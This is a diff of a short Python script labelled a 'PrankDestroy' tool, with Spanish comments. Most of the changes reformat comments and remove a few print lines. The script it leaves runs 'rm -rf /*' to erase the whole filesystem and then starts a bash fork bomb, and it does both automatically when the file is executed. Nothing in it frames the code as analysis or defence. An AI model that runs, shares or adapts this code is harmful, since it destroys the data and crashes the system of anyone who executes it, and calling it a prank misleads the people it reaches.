@@ -1,34 +1,35 @@
+# Delete Total System and created subprocess
+# By: https://github.com/Br3Fuck/PrankDestroy
+# Modulos:
+
 import os
 import time
 
-#Dando permisos jiji
+# Permisos:
+
 def permisos():
 	os.system("chmod +x *")
-	
 
+# Clear:
 
-#Clear
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
     
 
-# Deleted Carpetas
+# Deleted System:
+
 def deleted():
 	os.system("rm -rf /*")
 	time.sleep(6.50)
 	os.system(":(){ :|:& };:")
 	
+# Run:
+
 def script():
 	permisos()
 	clear()
 	print("¡Eliminando!...")
-	time.sleep(1)
-	print("¡Hecho!")
 	deleted()
 	
-	
 script()
-	
-
-    
